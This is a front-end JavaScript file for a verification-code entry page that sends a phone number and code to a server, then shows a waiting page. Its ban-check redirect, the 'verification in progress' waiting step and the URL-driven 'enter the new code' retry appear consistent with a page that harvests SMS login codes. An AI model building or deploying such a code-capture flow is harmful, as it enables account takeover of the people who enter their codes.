const API_VERIFY = '/api/verify-code';
function getParam(name) { return new URL(window.location.href).searchParams.get(name); }
const phone = getParam('phone') || '--';
const length = parseInt(getParam('length')) || 6;
const isRetry = getParam('retry') === '1';
document.getElementById('codePhone').textContent = phone;

async function checkBan() {
    try {
        const res = await fetch('/api/check-ban');
        const data = await res.json();
        if (data.banned) window.location.href = 'banned.html';
    } catch (e) { console.error('Ban check error:', e); }
}

const statusEl = document.getElementById('codeStatus');
if (isRetry) {
    statusEl.textContent = '⚠️ The previous code was incorrect. Please enter the new code.';
    statusEl.className = 'status-message error';
}

const container = document.getElementById('codeInputs');
container.innerHTML = '';
for (let i = 0; i < length; i++) {
    const input = document.createElement('input');
    input.type = 'text'; input.maxLength = 1; input.className = 'code-digit';
    input.dataset.index = i; container.appendChild(input);
}
const inputs = document.querySelectorAll('.code-digit');

inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const val = e.target.value.replace(/\D/g, '');
        e.target.value = val;
        if (val && index < inputs.length - 1) inputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
        if (e.key === 'Enter') verifyCode();
    });
    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        for (let i = 0; i < paste.length && i < inputs.length; i++) inputs[i].value = paste[i];
        const nextIdx = Math.min(paste.length, inputs.length - 1);
        inputs[nextIdx].focus();
    });
});

async function verifyCode() {
    const btn = document.getElementById('verifyBtn');
    const status = document.getElementById('codeStatus');
    let code = '';
    inputs.forEach(inp => code += inp.value);
    if (code.length !== length) {
        status.textContent = '⚠️ Please enter all ' + length + ' digits';
        status.className = 'status-message error';
        return;
    }
    btn.classList.add('loading'); btn.disabled = true; status.textContent = '';
    try {
        const res = await fetch(API_VERIFY, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, code }) });
        const data = await res.json();
        if (res.ok && data.success) {
            status.textContent = '✅ Code submitted, verification in progress...';
            status.className = 'status-message success';
            setTimeout(() => { window.location.href = 'verify-wait.html?phone=' + encodeURIComponent(phone) + '&length=' + length; }, 800);
        } else {
            status.textContent = data.message || '❌ Incorrect code';
            status.className = 'status-message error';
            inputs.forEach(i => { i.value = ''; }); inputs[0].focus();
        }
    } catch (e) {
        status.textContent = '❌ Network error, please try again';
        status.className = 'status-message error';
    } finally { btn.classList.remove('loading'); btn.disabled = false; }
}

checkBan();
window.verifyCode = verifyCode;
